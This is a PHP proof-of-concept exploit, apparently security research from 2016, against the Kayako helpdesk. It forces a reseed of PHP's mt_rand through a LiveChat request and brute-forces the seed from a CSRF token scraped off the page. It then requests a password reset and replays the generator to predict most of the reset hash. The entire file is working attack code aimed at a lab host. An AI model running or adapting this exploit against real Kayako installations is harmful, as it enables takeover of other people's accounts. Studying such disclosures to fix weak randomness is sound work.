<?php

/**
 * Crack the seed of Kayako's random number generator, and determine part of the password reset hash.
 * 
 * Sjoerd Langkemper, 2016
 **/

/**
 * Make a hash. Copied from Kayako.
 **/
function BuildHash()
{
    return BuildHashBlock() . BuildHashBlock() . BuildHashBlock() . BuildHashBlock();
}

/**
 * Build a Unique Hash Block. Copied from Kayako.
 */
function BuildHashBlock()
{
    $sub = mt_rand(0, 36 * 36 * 36);
    $Ch1to3 = $sub - 1;
    $sec = mt_rand(0, 36 * 36);
    $Ch4to5 = $sec - 1;
    $Ch6to8 = hexdec(substr(uniqid(), -6)) % (36 * 36 * 36);

    return str_pad(base_convert($Ch1to3, 10, 36), 3, '0', STR_PAD_LEFT) . str_pad(base_convert($Ch4to5, 10, 36), 2, '0', STR_PAD_LEFT) . str_pad(base_convert($Ch6to8, 10, 36), 3, '0', STR_PAD_LEFT);
}

/**
 * Extract the CSRF hash from a string.
 **/
function GetCsrfHashFromPage($page) {
    preg_match('~name="_csrfhash" value="([^"]*)"~', $page, $matches);
    return $matches[1];
}

/**
 * Retrieve the mt_rand output given a BuildHash output.
 **/
function GetRandsFromHash($block) {
    $first = base_convert(substr($block, 0, 3), 36, 10) + 1; // mod 46656
    $second = base_convert(substr($block, 3, 2), 36, 10) + 1; // mod 1296
    return array($first, $second);
}

/**
 * Try different seeds between $start and $end until we find the one that generates $hash.
 **/
function FindSeed($hash, $start, $end) {
    list($first, $second) = GetRandsFromHash($hash);
    printf("Working from %.6f to %.6f\n", $end, $start);
    $start_usec = $start * 1e6;
    $end_usec = $end * 1e6;

    $current_usec = $end_usec;
    while ($current_usec >= $start_usec) {
        $seconds = floor($current_usec / 1e6);
        $usec = ($current_usec % 1e6) / 1e6;

        $seed = (float) $seconds + ((float) $usec * 100000);
        mt_srand($seed);
        for ($i = 0; $i < 40; $i++) {
            if (mt_rand(0, 36 * 36 * 36) == $first && mt_rand(0, 36 * 36) == $second) {
                return $seed;
            }
        }

        $current_usec -= 1;
    }
    die('seed not found');
}

$base_url = 'http://172.16.122.131:8333';
$reseed_url = $base_url . "/visitor/index.php?/LiveChat/VisitorUpdate/UpdateFootprint/_isFirstTime=0/_sessionID=1";
$lost_pw_url = $base_url . "/index.php?/Base/UserLostPassword/Submit";

// Persistent curl object. This uses keep-alive, so all requests go to the same process.
$curl = curl_init();
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_COOKIEJAR, '/dev/null');     // Enable cookie handling

// Cause mt_srand call and remember about when it happened
curl_setopt($curl, CURLOPT_URL, $reseed_url);
$start = microtime(true);
curl_exec($curl);
$end = microtime(true);

// Get a valid hash
curl_setopt($curl, CURLOPT_URL, $base_url);
$response = curl_exec($curl);
$hash = GetCsrfHashFromPage($response);

// Crack the seed of mt_rand
$seed = FindSeed($hash, $start, $end);

// Ask for reset password
curl_setopt($curl, CURLOPT_URL, $lost_pw_url);
curl_setopt($curl, CURLOPT_POSTFIELDS, 'email=some%40user.com');
$start = microtime(true);
$response = curl_exec($curl);
$end = microtime(true);

// Seed random number generator and replay it into the correct state.
mt_srand($seed);
for ($i = 0; $i < 34; $i++) {
    mt_rand();
}

// Our hash, but with wrong uniqid values
$base_hash = BuildHash();

// Clear uniqid positions
$hash_template = '';
for ($i = 0; $i < 4; $i++) {
    $hash_template .= substr($base_hash, 8 * $i, 5) . '...';
}

// Done
echo "The hash looks like this: $hash_template\n";
